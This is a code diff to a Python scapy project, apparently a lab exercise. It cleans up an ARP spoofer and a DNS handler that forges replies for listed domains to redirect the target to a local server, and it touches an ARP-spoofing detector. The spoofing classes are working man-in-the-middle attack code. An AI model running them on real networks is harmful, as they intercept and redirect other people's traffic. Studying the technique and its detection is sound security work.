@@ -49,7 +49,6 @@ class ArpSpoofer(object):
         @return the mac address of the target.
         """
         response = scapy.sr1(ARP(op=1, pdst=DOOFENSHMIRTZ_IP), timeout=2, verbose=0, iface=IFACE)
-        print(response.hwsrc)
         return response.hwsrc
 
     def spoof(self) -> None:
@@ -116,23 +115,11 @@ class DnsHandler(object):
         @return DNS response to pkt, source IP changed.
         url = pkt[DNS].qd.qname.decode()
         """
-        url = pkt[DNS].qd.qname.decode()
-        request_to_real = IP(dst='8.8.8.8') / UDP(sport=pkt[UDP].sport) / DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname))
+        request_to_real = IP(dst=REAL_DNS_SERVER_IP) / UDP(sport=pkt[UDP].sport) / DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname))
         response_from_real = sr1(request_to_real, verbose=False)
         response_to_client = IP(src=NETWORK_DNS_SERVER_IP, dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport)/DNS()
         response_to_client[DNS] = response_from_real[DNS]
         return response_to_client
-        # TODO: WTF
-        target_ip = pkt[IP].src
-        pkt = IP(dst=REAL_DNS_SERVER_IP) / UDP(dport=53, sport=5252) / DNS(rd=1,qd=DNSQR(qname=url))
-        print(f'packet to send: {pkt}')
-        res = sr1(pkt, iface=IFACE_REAL)
-        print(f'got res: {res}')
-        res[IP].src = NETWORK_DNS_SERVER_IP
-        res[IP].dst = target_ip
-        return res
-
-        # לדעתי זה לא עובד בכלל
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
@@ -144,7 +131,7 @@ class DnsHandler(object):
         @return fake DNS response to the request.
         """
         print(f'got packet {pkt}')
-        url =pkt[DNS].qd.qname.decode()[:-1]
+        url = pkt[DNS].qd.qname.decode()[:-1]
         print(f'weird value: {pkt[DNSQR].qname}')
         print(f'sending response with value {to}')
 
@@ -165,7 +152,6 @@ class DnsHandler(object):
                 rdata=to)
         )
         response = IP(dst=pkt[IP].src, src=NETWORK_DNS_SERVER_IP)/UDP(dport=pkt[UDP].sport, sport=53) / dns
-        print(f'preparing to send {response}')
         return response
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
@@ -177,19 +163,13 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return string describing the choice made
         """
-        print(f'got packet: {pkt}')
-        url =pkt[DNS].qd.qname.decode()[:-1]
+        url = pkt[DNS].qd.qname.decode()[:-1]
         if url in SPOOF_DICT:
-            print(f'got DNS request: {url}')
             scapy.send(self.get_spoofed_dns_response(pkt, to=SPOOF_DICT[url]), iface=IFACE)
             return f"[DNS_SPOOF] found a dns query to {url}, return the local server"
-        print(scapy.send(self.get_real_dns_response(pkt), iface=IFACE))
-        # TODO: WTF
-        return ''
-        print(self.get_real_dns_response(pkt))
-        return ''
         scapy.send(self.get_real_dns_response(pkt), iface=IFACE)
-        return f"[DNS_SPOOF] found a DNS request to {pkt['DNS Question Record'].qname} and handled it correctly"
+
+        return "[DNS_SPOOF] found a DNS request and handled it correctly"
 
     def run(self) -> None:
         """
@@ -222,7 +202,7 @@ class ArpSpoofDetect:
     def check_pkt(self, packet):
         if ARP in packet and packet[ARP].op == 2:
             # looking for arp responses
-            # TODO: WTF
+
             if packet[ARP].hwsrc != packet[ARP].hwdst:
                 print(f"ARP Spoofing detected: Source {packet[ARP].psrc} is using {packet[ARP].hwsrc}")
                 self.found = True
